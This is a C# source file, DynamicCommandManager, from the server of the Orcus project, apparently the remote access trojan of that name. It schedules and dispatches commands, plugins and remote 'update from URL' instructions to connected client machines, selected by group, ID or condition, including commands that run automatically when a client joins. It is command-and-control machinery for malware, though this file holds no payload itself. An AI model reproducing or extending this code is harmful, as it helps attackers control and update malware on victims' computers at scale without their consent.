using System;
using System.Collections.Generic;
using System.Linq;
using NLog;
using Orcus.Server.Core.Database;
using Orcus.Server.Core.DynamicCommands.SpecialCommands;
using Orcus.Server.Core.Extensions;
using Orcus.Shared.Client;
using Orcus.Shared.Compression;
using Orcus.Shared.Connection;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.CommandTargets;
using Orcus.Shared.DynamicCommands.TransmissionEvents;
using Orcus.Shared.NetSerializer;

namespace Orcus.Server.Core.DynamicCommands
{
    public class DynamicCommandManager : IDisposable
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();

        private readonly CacheManager _cacheManager;
        private readonly DatabaseManager _databaseManager;
        private readonly DynamicCommandScheduler _dynamicCommandScheduler;
        private readonly Dictionary<Guid, SpecialCommand> _specialCommands;
        private readonly TcpServer _tcpServer;
        private EventHandler<List<DynamicCommandEvent>> _dynamicCommandEventsAddedEvent;
        private readonly object _activeCommandsLock = new object();
        private readonly object _dynamicCommandsLock = new object();

        public DynamicCommandManager(DatabaseManager databaseManager, TcpServer tcpServer)
        {
            _databaseManager = databaseManager;
            _tcpServer = tcpServer;
            DynamicCommands = databaseManager.GetDynamicCommands(true);
            ActiveCommands = new List<ActiveCommandInfo>();
            _dynamicCommandScheduler = new DynamicCommandScheduler(DynamicCommands);
            _dynamicCommandScheduler.ExecuteDynamicCommand += DynamicCommandSchedulerExecuteDynamicCommand;
            _cacheManager = new CacheManager(databaseManager);
            DynamicCommandPluginSender = new DynamicCommandPluginSender(databaseManager);
            ActiveCommandEventManager = new ActiveCommandEventManager();

            _specialCommands =
                new Dictionary<Guid, SpecialCommand>(
                    new[] {(SpecialCommand) new WakeOnLanSpecialCommand()}.ToDictionary(x => x.CommandId, y => y));
            _dynamicCommandScheduler.Activate();
        }

        public void Dispose()
        {
            Logger.Debug("Dispose DynamicCommandManager");
            _dynamicCommandScheduler.Dispose();
            _cacheManager.Dispose();
        }   

        public List<RegisteredDynamicCommand> DynamicCommands { get; }
        public DynamicCommandPluginSender DynamicCommandPluginSender { get; }
        public List<ActiveCommandInfo> ActiveCommands { get; }
        public ActiveCommandEventManager ActiveCommandEventManager { get; }

        public event EventHandler<RegisteredDynamicCommand> DynamicCommandAdded;
        public event EventHandler<DynamicCommandStatusUpdatedEventArgs> DynamicCommandStatusUpdated;

        public event EventHandler<List<DynamicCommandEvent>> DynamicCommandEventsAdded
        {
            add
            {
                if (_dynamicCommandEventsAddedEvent == null)
                    _cacheManager.DynamicCommandEventsAdded += CacheManagerOnDynamicCommandEventsAdded;

                _dynamicCommandEventsAddedEvent += value;
            }
            remove
            {
                _dynamicCommandEventsAddedEvent -= value;

                if (_dynamicCommandEventsAddedEvent == null)
                    _cacheManager.DynamicCommandEventsAdded -= CacheManagerOnDynamicCommandEventsAdded;
            }
        }

        public ActiveCommandInfo GetActiveCommandById(int id)
        {
            lock (_activeCommandsLock)
                return ActiveCommands.FirstOrDefault(x => x.DynamicCommand.Id == id);
        }

        public RegisteredDynamicCommand GetDynamicCommandById(int id)
        {
            lock (_dynamicCommandsLock)
                return DynamicCommands.FirstOrDefault(x => x.Id == id);
        }

        public void StopActiveCommand(ActiveCommandInfo activeCommandInfo)
        {
            lock (activeCommandInfo.ClientsLock)
            {
                Logger.Info("Stop active command {0} with {1} executing clients", activeCommandInfo.DynamicCommand.Id,
                    activeCommandInfo.Clients.Count);

                foreach (var client in activeCommandInfo.Clients)
                    client.StopActiveCommand(activeCommandInfo.DynamicCommand.Id);

                _databaseManager.SetDynamicCommandStatus(activeCommandInfo.DynamicCommand.Id, DynamicCommandStatus.Stopped);
                activeCommandInfo.DynamicCommand.Status = DynamicCommandStatus.Stopped;
            }
        }

        private void CacheManagerOnDynamicCommandEventsAdded(object sender,
            List<DynamicCommandEvent> dynamicCommandEvents)
        {
            _dynamicCommandEventsAddedEvent?.Invoke(this, dynamicCommandEvents);
        }

        private void DynamicCommandSchedulerExecuteDynamicCommand(object sender, ExecuteDynamicCommandEventArgs e)
        {
            ExecuteDynamicCommand(e.DynamicCommand,
                e.DynamicCommand.TransmissionEvent.GetType() != typeof (RepeatingTransmissionEvent));

            if (e.DynamicCommand.TransmissionEvent.GetType() == typeof (DateTimeTransmissionEvent))
                _databaseManager.RemoveDynamicCommandParameter(e.DynamicCommand.Id);
        }

        public void ReceivedResult(DynamicCommandEvent dynamicCommandEvent, Client client)
        {
            _cacheManager.AddCommandEvent(dynamicCommandEvent);

            if (dynamicCommandEvent.Status == ActivityType.Active || dynamicCommandEvent.Status == ActivityType.Stopped)
            {
                lock (_activeCommandsLock)
                {
                    var activeCommand =
                        ActiveCommands.FirstOrDefault(x => x.DynamicCommand.Id == dynamicCommandEvent.DynamicCommand);
                    if (activeCommand == null)
                    {
                        var dynamicCommand =
                            _databaseManager.GetDynamicCommandById(dynamicCommandEvent.DynamicCommand);
                        if (dynamicCommand == null)
                        {
                            //when there is no command on this server with the id, we stop it because it may be removed by an administrator
                            client.StopActiveCommand(dynamicCommandEvent.DynamicCommand);
                            return;
                        }

                        ActiveCommands.Add(activeCommand = new ActiveCommandInfo(dynamicCommand));
                    }

                    switch (dynamicCommandEvent.Status)
                    {
                        case ActivityType.Active:
                            lock (activeCommand.ClientsLock)
                                activeCommand.Clients.Add(client);
                            ActiveCommandEventManager.AddClient(activeCommand, client);
                            CheckClientExecuteActiveCommand(activeCommand, client);
                            break;
                        case ActivityType.Stopped:
                            lock (activeCommand.ClientsLock)
                                activeCommand.Clients.Remove(client);
                            ActiveCommandEventManager.RemoveClient(activeCommand, client);

                            if (activeCommand.Clients.Count == 0)
                            {
                                ActiveCommands.Remove(activeCommand);
                                if (activeCommand.DynamicCommand.Status == DynamicCommandStatus.Active)
                                    //don't change the status when stopped
                                    activeCommand.DynamicCommand.Status = DynamicCommandStatus.Done;
                                ActiveCommandEventManager.RemoveActiveCommand(activeCommand);
                            }
                            break;
                    }
                }
            }
        }

        public void AddDynamicCommand(DynamicCommand dynamicCommand)
        {
            Logger.Info("Add new dynamic command with command id {0:D}", dynamicCommand.CommandId);

            int pluginId = -1;
            if (dynamicCommand.PluginHash != null &&
                !_databaseManager.CheckIsStaticCommandPluginAvailable(dynamicCommand.PluginHash, out pluginId))
            {
                Logger.Error(
                    $"The received dynamic command can't be executed because the plugin ({StringExtensions.BytesToHex(dynamicCommand.PluginHash)}) is not available");
                return;
            }

            var registeredCommand = new RegisteredDynamicCommand
            {
                Id = _databaseManager.AddDynamicCommand(dynamicCommand, pluginId),
                CommandId = dynamicCommand.CommandId,
                Conditions = dynamicCommand.Conditions,
                ExecutionEvent = dynamicCommand.ExecutionEvent,
                Target = dynamicCommand.Target,
                TransmissionEvent = dynamicCommand.TransmissionEvent,
                PluginHash = dynamicCommand.PluginHash,
                PluginResourceId = pluginId,
                Timestamp = DateTime.UtcNow,
                StopEvent = dynamicCommand.StopEvent
            };

            lock (_dynamicCommandsLock)
                DynamicCommands.Add(registeredCommand);
            DynamicCommandAdded?.Invoke(this, registeredCommand);

            if (dynamicCommand.TransmissionEvent.GetType() == typeof (ImmediatelyTransmissionEvent))
            {
                ExecuteDynamicCommand(registeredCommand, true, dynamicCommand.CommandParameter);
                return;
            }

            if (dynamicCommand.TransmissionEvent.GetType() == typeof (EveryClientOnceTransmissionEvent))
            {
                ExecuteDynamicCommand(registeredCommand, false, dynamicCommand.CommandParameter);
                return;
            }

            if (registeredCommand.TransmissionEvent.GetType() == typeof (DateTimeTransmissionEvent) ||
                registeredCommand.TransmissionEvent.GetType() == typeof (RepeatingTransmissionEvent))
            {
                _dynamicCommandScheduler.AddDynamicCommand(registeredCommand);
            }
        }

        public void RemoveDynamicCommand(RegisteredDynamicCommand dynamicCommand)
        {
            Logger.Debug("Remove dynamic command with id {0}", dynamicCommand.Id);

            if(dynamicCommand.CommandType == CommandType.Active)
                lock (_activeCommandsLock)
                {
                    var activeCommand = ActiveCommands.FirstOrDefault(x => x.DynamicCommand.Id == dynamicCommand.Id);
                    if (activeCommand != null)
                        StopActiveCommand(activeCommand);
                }

            _dynamicCommandScheduler.RemoveDynamicCommand(dynamicCommand);
            lock (_dynamicCommandsLock)
                DynamicCommands.Remove(dynamicCommand);
            _databaseManager.RemoveDynamicCommand(dynamicCommand.Id);
        }

        public List<RegisteredDynamicCommand> GetDynamicCommands()
        {
            Logger.Debug("Get all dynamic commands");

            var dynamicCommands = _databaseManager.GetDynamicCommands();
            lock (_activeCommandsLock)
            {
                foreach (var registeredDynamicCommand in dynamicCommands)
                {
                    var activeCommandInfo =
                        ActiveCommands.FirstOrDefault(x => x.DynamicCommand.Id == registeredDynamicCommand.Id);
                    if (activeCommandInfo != null)
                    {
                        registeredDynamicCommand.Status = DynamicCommandStatus.Active;
                        lock (activeCommandInfo.ClientsLock)
                            registeredDynamicCommand.ExecutingClientIds =
                                activeCommandInfo.Clients.Select(x => x.Id).ToArray();
                    }
                }
            }

            return dynamicCommands;
        }

        public void OnClientJoin(Client client)
        {
            Logger.Debug("Client CI-{0} joined, check if there are commands to execute", client.Id);

            lock (_dynamicCommandsLock)
            {
                foreach (
                    var command in
                    DynamicCommands.Where(
                        x =>
                            (x.TransmissionEvent.GetType() == typeof(OnJoinTransmissionEvent)) &&
                            IsClientInTargets(client, x.Target) &&
                            CheckConditions(client.GetOnlineClientInformation(), client.ComputerInformation.ClientConfig,
                                x.Conditions)))
                {
                    if (ExecuteStaticCommand(new[] {client},
                                DynamicCommandToPotentialCommand(command,
                                    _databaseManager.GetDynamicCommandParameter(command.Id)))
                            .Count == 1)
                        _databaseManager.AddDynamicCommandEvent(command.Id, client.Id, ActivityType.Sent, null);
                }

                foreach (
                    var command in
                    DynamicCommands.Where(
                        x =>
                            x.TransmissionEvent.GetType() == typeof(EveryClientOnceTransmissionEvent) &&
                            IsClientInTargets(client, x.Target) &&
                            CheckConditions(client.GetOnlineClientInformation(), client.ComputerInformation.ClientConfig,
                                x.Conditions)))
                {
                    if (!_databaseManager.ClientCommandExecuted(client.Id, command.Id))
                    {
                        if (ExecuteStaticCommand(new[] {client},
                                DynamicCommandToPotentialCommand(command,
                                    _databaseManager.GetDynamicCommandParameter(command.Id))).Count == 1)
                            _databaseManager.AddDynamicCommandEvent(command.Id, client.Id, ActivityType.Sent, null);
                    }
                }
            }

            if (client.ComputerInformation.ActiveCommands?.Count > 0)
            {
                lock (_activeCommandsLock)
                    foreach (var activeCommandId in client.ComputerInformation.ActiveCommands)
                    {
                        var activeCommand = ActiveCommands.FirstOrDefault(x => x.DynamicCommand.Id == activeCommandId);
                        if (activeCommand == null)
                        {
                            var dynamicCommand =
                                _databaseManager.GetDynamicCommandById(activeCommandId);
                            if (dynamicCommand == null)
                            {
                                //when there is no command on this server with the id, we stop it because it may be removed by an administrator
                                client.StopActiveCommand(activeCommandId);
                                return;
                            }

                            ActiveCommands.Add(activeCommand = new ActiveCommandInfo(dynamicCommand));
                            ActiveCommandEventManager.AddActiveCommand(activeCommand);
                        }

                        lock (activeCommand.ClientsLock)
                            activeCommand.Clients.Add(client);

                        CheckClientExecuteActiveCommand(activeCommand, client);
                        ActiveCommandEventManager.AddClient(activeCommand, client);
                    }
            }
        }

        public void ClientDisconnected(Client client)
        {
            lock (_activeCommandsLock)
                for (int i = ActiveCommands.Count - 1; i >= 0; i--)
                {
                    var activeCommand = ActiveCommands[i];

                    lock (activeCommand.ClientsLock)
                        if (activeCommand.Clients.Contains(client))
                        {
                            activeCommand.Clients.Remove(client);
                            ActiveCommandEventManager.RemoveClient(activeCommand, client);
                        }

                    if (activeCommand.Clients.Count == 0)
                    {
                        ActiveCommands.Remove(activeCommand);
                        if (activeCommand.DynamicCommand.Status == DynamicCommandStatus.Active)
                            //don't change the status when stopped
                            activeCommand.DynamicCommand.Status = DynamicCommandStatus.Done;
                        ActiveCommandEventManager.RemoveActiveCommand(activeCommand);
                    }
                }
        }

        private void CheckClientExecuteActiveCommand(ActiveCommandInfo activeCommandInfo, Client client)
        {
            if (activeCommandInfo.DynamicCommand.Status == DynamicCommandStatus.Stopped)
                client.StopActiveCommand(activeCommandInfo.DynamicCommand.Id);
        }

        private void ExecuteDynamicCommand(RegisteredDynamicCommand registeredDynamicCommand, bool setDone,
            byte[] parameter)
        {
            Logger.Info("Send dynamic command (ID: {0}, conditions: {1}, type: {2})", registeredDynamicCommand.Id,
                registeredDynamicCommand.Conditions?.Count ?? 0,
                registeredDynamicCommand.TransmissionEvent.GetType().Name);

            DynamicCommandStatusUpdated?.Invoke(this,
                new DynamicCommandStatusUpdatedEventArgs(registeredDynamicCommand.Id, DynamicCommandStatus.Transmitting));

            SpecialCommand specialCommand;
            List<int> clientList;

            if (_specialCommands.TryGetValue(registeredDynamicCommand.CommandId, out specialCommand))
            {
                var clients =
                    GetClients(registeredDynamicCommand.Target, specialCommand.ValidClients)
                        .Where(
                            x =>
                                CheckConditions(x.ClientInformation, x.Client.ComputerInformation.ClientConfig,
                                    registeredDynamicCommand.Conditions)).ToList();

                clientList = specialCommand.Execute(parameter, clients, _tcpServer);
            }
            else
            {
                var clients = GetClients(registeredDynamicCommand.Target, ValidClients.OnlineOnly);
                var potentialCommand = DynamicCommandToPotentialCommand(registeredDynamicCommand, parameter);

                clientList =
                    ExecuteStaticCommand(
                        clients.Where(
                            x =>
                                CheckConditions(x.ClientInformation, x.Client.ComputerInformation.ClientConfig,
                                    registeredDynamicCommand.Conditions))
                            .Select(x => x.Client),
                        potentialCommand);
            }

            var events =
                clientList.Select(
                    x =>
                        new DynamicCommandEvent
                        {
                            ClientId = x,
                            DynamicCommand = registeredDynamicCommand.Id,
                            Status = ActivityType.Sent,
                            Timestamp = DateTime.UtcNow
                        }).ToList();

            _cacheManager.AddCommandEvents(events);

            if (setDone)
            {
                _databaseManager.SetDynamicCommandStatus(registeredDynamicCommand.Id, DynamicCommandStatus.Done);
                DynamicCommandStatusUpdated?.Invoke(this,
                    new DynamicCommandStatusUpdatedEventArgs(registeredDynamicCommand.Id, DynamicCommandStatus.Done));
            }
            else
            {
                DynamicCommandStatusUpdated?.Invoke(this,
                    new DynamicCommandStatusUpdatedEventArgs(registeredDynamicCommand.Id, DynamicCommandStatus.Pending));
            }
            Logger.Info($"Dynamic command {registeredDynamicCommand.Id} was sent");
        }

        private List<TargetedClient> GetClients(CommandTarget commandTarget, ValidClients validClients)
        {
            if (validClients == ValidClients.OnlineOnly)
            {
                var clients = new List<TargetedClient>();

                if (commandTarget == null)
                {
                    clients =
                        _tcpServer.Clients.Select(x => new TargetedClient(x.Value)).ToList();
                }
                else if (commandTarget is TargetedGroups)
                {
                    var groupTarget = (TargetedGroups) commandTarget;
                    foreach (var client in _tcpServer.Clients)
                    {
                        if (groupTarget.Groups.Contains(client.Value.Data.Group))
                            clients.Add(new TargetedClient(client.Value));
                    }
                }
                else if (commandTarget is TargetedClients)
                {
                    var clientTarget = (TargetedClients) commandTarget;
                    foreach (var client in clientTarget.Clients)
                    {
                        Client foundClient;
                        if (_tcpServer.Clients.TryGetValue(client, out foundClient))
                            clients.Add(new TargetedClient(foundClient));
                    }
                }

                return clients;
            }
            else
            {
                var allClients = _databaseManager.GetAllClients().ToList();
                var clients = new List<TargetedClient>();
                bool? targetsGroups = commandTarget == null ? null : (bool?) (commandTarget is TargetedGroups);
                var targetedGroups = targetsGroups == true ? (TargetedGroups) commandTarget : null;
                var targetedClients = targetsGroups == false ? (TargetedClients) commandTarget : null;

                foreach (var offlineClientInformation in allClients)
                {
                    if (targetsGroups == true && !targetedGroups.Groups.Contains(offlineClientInformation.Group))
                        continue;

                    if (targetsGroups == false && !targetedClients.Clients.Contains(offlineClientInformation.Id))
                        continue;

                    Client client;
                    if (_tcpServer.Clients.TryGetValue(offlineClientInformation.Id, out client))
                    {
                        if (validClients == ValidClients.OfflineOnly)
                            continue;

                        clients.Add(new TargetedClient(client));
                    }
                    else
                        clients.Add(new TargetedClient(offlineClientInformation));
                }
                return clients;
            }
        }

        private void ExecuteDynamicCommand(RegisteredDynamicCommand registeredDynamicCommand, bool setDone)
        {
            ExecuteDynamicCommand(registeredDynamicCommand, setDone,
                _databaseManager.GetDynamicCommandParameter(registeredDynamicCommand.Id));
        }

        private static PotentialCommand DynamicCommandToPotentialCommand(
            RegisteredDynamicCommand registeredDynamicCommand, byte[] parameter)
        {
            return new PotentialCommand
            {
                CallbackId = registeredDynamicCommand.Id,
                CommandId = registeredDynamicCommand.CommandId,
                ExecutionEvent = registeredDynamicCommand.ExecutionEvent,
                Parameter = parameter,
                PluginHash = registeredDynamicCommand.PluginHash,
                PluginResourceId = registeredDynamicCommand.PluginResourceId,
                StopEvent = registeredDynamicCommand.StopEvent
            };
        }

        private static List<int> ExecuteStaticCommand(IEnumerable<Client> clients, PotentialCommand potentialCommand)
        {
            Logger.Debug("Execute static command {0}", potentialCommand.CallbackId);

            var data = new Serializer(typeof (PotentialCommand)).Serialize(potentialCommand);
            var isCompressed = false;
            if (data.Length > 512)
            {
                var compressedData = LZF.Compress(data, 0);
                if (compressedData.Length < data.Length)
                {
                    isCompressed = true;
                    data = compressedData;
                }
            }

            var updateCommandCompatibilityParameter =
                new Lazy<byte[]>(() => CompatibilityManager.UpdateCommandToOldUpdateCommand(potentialCommand));
            var updateFromUrlCompatibilityParameter =
                new Lazy<byte[]>(
                    () => CompatibilityManager.UpdateFromUrlCommandToOldUpdateFromUrlCommand(potentialCommand));
            var compatibilityData = new Lazy<byte[]>(() => CompatibilityManager.GetOldPotentialCommand(potentialCommand));

            var clientList = new List<int>();
            foreach (var client in clients)
            {
                try
                {
                    if (client.ComputerInformation.ClientVersion >= 19)
                    {
                        client.SendStaticCommand(data, isCompressed);
                        clientList.Add(client.Id);
                    }
                    else if (client.ComputerInformation.ClientVersion >= 13 && client.ComputerInformation.ClientVersion <= 18)
                    {
                        client.SendStaticCommand(compatibilityData.Value, isCompressed);
                        clientList.Add(client.Id);
                    }
                    else
                    {
                        //UpdateCommand
                        if (potentialCommand.CommandId ==
                            new Guid(0xafd0841b, 0x0035, 0x7045, 0x96, 0x32, 0x36, 0x98, 0x6c,
                                0xb1, 0x83, 0x1c))
                        {
                            client.SendStaticCommand(updateCommandCompatibilityParameter.Value, false);
                            clientList.Add(client.Id);
                        }

                        //UpdateFromUrlCommand
                        else if (potentialCommand.CommandId ==
                                 new Guid(0xe08e79f0, 0xcaea, 0xe341, 0x8a, 0xb2, 0xef, 0x84, 0xe1,
                                     0x8f, 0xa2, 0x5f))
                        {
                            client.SendStaticCommand(updateFromUrlCompatibilityParameter.Value, false);
                            clientList.Add(client.Id);
                        }
                    }
                }
                catch (Exception)
                {
                    // ignored
                }
            }

            Logger.Debug("Static command {0} successfully executed on {1} clients", potentialCommand.CallbackId, clientList.Count);

            return clientList;
        }

        public bool CheckConditions(ClientInformation clientInformation, ClientConfig clientConfig,
            List<Condition> conditions)
        {
            if (conditions == null)
                return true;

            return conditions.All(condition => condition.IsTrue(clientInformation, clientConfig));
        }

        public bool IsClientInTargets(Client client, CommandTarget commandTarget)
        {
            var targetedGroups = commandTarget as TargetedGroups;
            return targetedGroups?.Groups.Contains(client.Data.Group) ?? ((TargetedClients) commandTarget).Clients.Contains(client.Id);
        }
    }
}